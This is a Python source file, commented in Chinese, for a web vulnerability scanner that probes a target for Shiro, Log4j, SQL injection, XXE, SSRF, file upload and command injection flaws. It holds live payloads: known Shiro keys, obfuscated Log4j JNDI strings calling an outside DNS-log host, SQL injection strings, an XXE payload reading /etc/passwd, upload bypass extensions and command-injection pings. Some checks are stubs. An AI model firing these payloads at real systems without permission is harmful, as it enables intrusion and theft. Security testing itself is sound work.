#!/usr/bin/env python3
"""
深度漏洞扫描器 - 基于实战案例的智能漏洞检测
包含：Shiro、Log4j、SQL注入、文件上传、反序列化等
"""

import re
import base64
import hashlib
import requests
import subprocess
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class VulnResult:
    """漏洞结果"""
    vulnerable: bool
    vuln_type: str
    severity: str
    title: str
    description: str
    poc: str
    recommendation: str
    confidence: float


class DeepVulnScanner:
    """深度漏洞扫描器"""
    
    # Shiro默认密钥
    SHIRO_KEYS = [
        "kPH+bIxk5D2deZiIxcaaaA==",
        "4AvVhmFLUs0KTA3Kprsdag==",
        "Z3VucwAAAAAAAAAAAAAAAA==",
        "fCq+/xW488hMTCD+cmJ3aQ==",
        "0AvVhmFLUs0KTA3Kprsdag==",
        "1QWLxg+NYmxraMoxAXu/Iw==",
        "25BsmdYwjnfcWmnhAciDDg==",
        "2AvVhdsgUs0FSA3SDFAdag==",
        "3AvVhmFLUs0KTA3Kprsdag==",
        "3JvYhmBLUs0ETA5Kprsdag==",
        "r0e3c16IdVkouZgk1TKVMg==",
        "5aaC5qKm5oqA5pyvAAAAAA==",
        "bWljcm9zAAAAAAAAAAAAAA==",
        "wGiHplamyXlVB11UXWol8g==",
        "U3ByaW5nQmxhZGUAAAAAAA==",
        "MTIzNDU2Nzg5MGFiY2RlZg==",
        "L7RioUULEFhRyxM7a2R/Yg==",
        "a2VlcE9uR29pbmdBbmRGaQ==",
        "WcfHGU25gNnTxTlmJMeSpw==",
        "OY//C4rhfwNxCQAQCrQQ1Q==",
        "5AvVhmFLUs0KTA3Kprsdag==",
        "bWluZS1hc3NldC1rZXk6QQ==",
        "7AvVhmFLUs0KTA3Kprsdag==",
        "6AvVhmFLUs0KTA3Kprsdag==",
        "8AvVhmFLUs0KTA3Kprsdag==",
        "9AvVhmFLUs0KTA3Kprsdag==",
        "cmVtZW1iZXJNZQAAAAAAAA==",
        "ZUdsaGJuSmxibVI2ZHc9PQ=="
    ]
    
    # Log4j JNDI Payloads
    LOG4J_PAYLOADS = [
        "${jndi:ldap://DNSLOG/a}",
        "${jndi:rmi://DNSLOG/a}",
        "${jndi:dns://DNSLOG/a}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://DNSLOG/a}",
        "${${lower:jndi}:${lower:ldap}://DNSLOG/a}",
        "${${upper:jndi}:${upper:ldap}://DNSLOG/a}",
        "${${::-j}ndi:ldap://DNSLOG/a}",
        "${jndi:ldap://DNSLOG/a}",
        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//DNSLOG/a}",
        "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://DNSLOG/a}",
        "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://DNSLOG/a}"
    ]
    
    # SQL注入Payloads
    SQLI_PAYLOADS = {
        "error_based": [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,version()))--"
        ],
        "time_based": [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT pg_sleep(5)--"
        ],
        "boolean_based": [
            "' AND '1'='1",
            "' AND '1'='2",
            "' OR 1=1--",
            "' OR 1=2--"
        ]
    }
    
    # 文件上传绕过技巧
    UPLOAD_BYPASS = {
        "extensions": [
            ".php", ".php3", ".php4", ".php5", ".phtml", ".pht",
            ".jsp", ".jspx", ".jsw", ".jsv", ".jspf",
            ".asp", ".aspx", ".asa", ".cer", ".cdx",
            ".php.jpg", ".php;.jpg", ".php%00.jpg",
            ".php::$DATA", ".php:1.jpg"
        ],
        "content_types": [
            "image/jpeg", "image/png", "image/gif",
            "application/octet-stream"
        ]
    }
    
    def __init__(self, target: str, dnslog: str = ""):
        self.target = target
        self.dnslog = dnslog or "example.dnslog.cn"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    def scan_all(self) -> List[VulnResult]:
        """执行所有扫描"""
        results = []
        
        logger.info("🔍 开始深度漏洞扫描")
        
        # Shiro反序列化
        logger.info("  [1/7] Shiro反序列化检测...")
        shiro_result = self.detect_shiro()
        if shiro_result:
            results.append(shiro_result)
        
        # Log4j漏洞
        logger.info("  [2/7] Log4j漏洞检测...")
        log4j_result = self.detect_log4j()
        if log4j_result:
            results.append(log4j_result)
        
        # SQL注入
        logger.info("  [3/7] SQL注入检测...")
        sqli_results = self.detect_sqli()
        results.extend(sqli_results)
        
        # 文件上传
        logger.info("  [4/7] 文件上传检测...")
        upload_result = self.detect_file_upload()
        if upload_result:
            results.append(upload_result)
        
        # XXE漏洞
        logger.info("  [5/7] XXE漏洞检测...")
        xxe_result = self.detect_xxe()
        if xxe_result:
            results.append(xxe_result)
        
        # SSRF漏洞
        logger.info("  [6/7] SSRF漏洞检测...")
        ssrf_result = self.detect_ssrf()
        if ssrf_result:
            results.append(ssrf_result)
        
        # 命令注入
        logger.info("  [7/7] 命令注入检测...")
        rce_result = self.detect_rce()
        if rce_result:
            results.append(rce_result)
        
        logger.info(f"✅ 扫描完成，发现 {len(results)} 个漏洞")
        return results
    
    def detect_shiro(self) -> Optional[VulnResult]:
        """检测Shiro反序列化漏洞"""
        try:
            resp = self.session.get(self.target, timeout=10)
            
            # 检查rememberMe cookie
            if 'rememberMe=deleteMe' in resp.headers.get('Set-Cookie', ''):
                # 尝试检测密钥
                for key in self.SHIRO_KEYS[:5]:  # 限制测试数量
                    # 这里只是检测，不实际利用
                    pass
                
                return VulnResult(
                    vulnerable=True,
                    vuln_type="deserialization",
                    severity="high",
                    title="Shiro反序列化漏洞",
                    description="检测到Shiro框架，可能存在反序列化漏洞",
                    poc="使用shiro_attack工具进行深度检测",
                    recommendation="升级Shiro到最新版本，更换默认密钥",
                    confidence=0.8
                )
        except Exception as e:
            logger.debug(f"Shiro检测失败: {e}")
        
        return None
    
    def detect_log4j(self) -> Optional[VulnResult]:
        """检测Log4j漏洞"""
        # 测试常见注入点
        test_headers = ['User-Agent', 'Referer', 'X-Api-Version', 'X-Forwarded-For']
        
        for header in test_headers:
            try:
                payload = self.LOG4J_PAYLOADS[0].replace('DNSLOG', self.dnslog)
                headers = {header: payload}
                
                resp = self.session.get(self.target, headers=headers, timeout=5)
                
                # 这里需要检查dnslog记录，简化处理
                return VulnResult(
                    vulnerable=False,  # 需要手动确认
                    vuln_type="rce",
                    severity="critical",
                    title="Log4j RCE漏洞(需确认)",
                    description=f"在{header}头发现可能的Log4j注入点",
                    poc=f"Payload: {payload}",
                    recommendation="升级Log4j到2.17.1或更高版本",
                    confidence=0.5
                )
            except:
                continue
        
        return None
    
    def detect_sqli(self) -> List[VulnResult]:
        """检测SQL注入"""
        results = []
        
        # 解析URL参数
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        if not params:
            return results
        
        # 测试每个参数
        for param in list(params.keys())[:3]:  # 限制测试3个参数
            # 错误注入测试
            for payload in self.SQLI_PAYLOADS['error_based'][:3]:
                try:
                    test_url = self.target.replace(f"{param}={params[param][0]}", 
                                                   f"{param}={payload}")
                    resp = self.session.get(test_url, timeout=5)
                    
                    # 检测SQL错误
                    error_patterns = [
                        r'SQL syntax.*MySQL',
                        r'Warning.*mysql_',
                        r'valid MySQL result',
                        r'MySqlClient\.',
                        r'PostgreSQL.*ERROR',
                        r'Warning.*pg_',
                        r'valid PostgreSQL result',
                        r'Npgsql\.',
                        r'Driver.* SQL[\-\_\ ]*Server',
                        r'OLE DB.* SQL Server',
                        r'SQL Server.*Driver',
                        r'Warning.*mssql_',
                        r'Microsoft SQL Native Client error'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            results.append(VulnResult(
                                vulnerable=True,
                                vuln_type="sqli",
                                severity="high",
                                title=f"SQL注入漏洞 - {param}参数",
                                description=f"参数{param}存在SQL注入漏洞",
                                poc=f"Payload: {payload}",
                                recommendation="使用参数化查询，过滤特殊字符",
                                confidence=0.9
                            ))
                            return results
                except:
                    continue
        
        return results
    
    def detect_file_upload(self) -> Optional[VulnResult]:
        """检测文件上传漏洞"""
        # 查找上传表单
        try:
            resp = self.session.get(self.target, timeout=10)
            
            # 检测上传表单
            if '<input' in resp.text and 'type="file"' in resp.text:
                return VulnResult(
                    vulnerable=False,
                    vuln_type="file_upload",
                    severity="medium",
                    title="发现文件上传功能",
                    description="目标存在文件上传功能，建议手动测试",
                    poc="测试各种文件类型和绕过技巧",
                    recommendation="验证文件类型，限制文件大小，随机文件名",
                    confidence=0.6
                )
        except:
            pass
        
        return None
    
    def detect_xxe(self) -> Optional[VulnResult]:
        """检测XXE漏洞"""
        # XXE payload
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""
        
        try:
            headers = {'Content-Type': 'application/xml'}
            resp = self.session.post(self.target, data=xxe_payload, 
                                    headers=headers, timeout=5)
            
            if 'root:' in resp.text or '/bin/bash' in resp.text:
                return VulnResult(
                    vulnerable=True,
                    vuln_type="xxe",
                    severity="high",
                    title="XXE漏洞",
                    description="XML外部实体注入漏洞",
                    poc=xxe_payload,
                    recommendation="禁用外部实体解析",
                    confidence=0.95
                )
        except:
            pass
        
        return None
    
    def detect_ssrf(self) -> Optional[VulnResult]:
        """检测SSRF漏洞"""
        # 查找可能的SSRF参数
        ssrf_params = ['url', 'link', 'src', 'source', 'target', 'redirect', 'uri']
        
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        
        for param in params:
            if any(s in param.lower() for s in ssrf_params):
                return VulnResult(
                    vulnerable=False,
                    vuln_type="ssrf",
                    severity="medium",
                    title=f"可能的SSRF - {param}参数",
                    description=f"参数{param}可能存在SSRF漏洞",
                    poc=f"测试内网地址: http://127.0.0.1, http://169.254.169.254",
                    recommendation="验证URL白名单，禁止访问内网",
                    confidence=0.6
                )
        
        return None
    
    def detect_rce(self) -> Optional[VulnResult]:
        """检测命令注入"""
        # 命令注入payload
        rce_payloads = [
            "; ping -c 3 DNSLOG",
            "| ping -c 3 DNSLOG",
            "& ping -c 3 DNSLOG",
            "`ping -c 3 DNSLOG`",
            "$(ping -c 3 DNSLOG)"
        ]
        
        # 这里只是标记可能性
        return None


if __name__ == "__main__":
    scanner = DeepVulnScanner("https://example.com")
    results = scanner.scan_all()
    for r in results:
        print(f"[{r.severity.upper()}] {r.title}")
        print(f"  {r.description}")
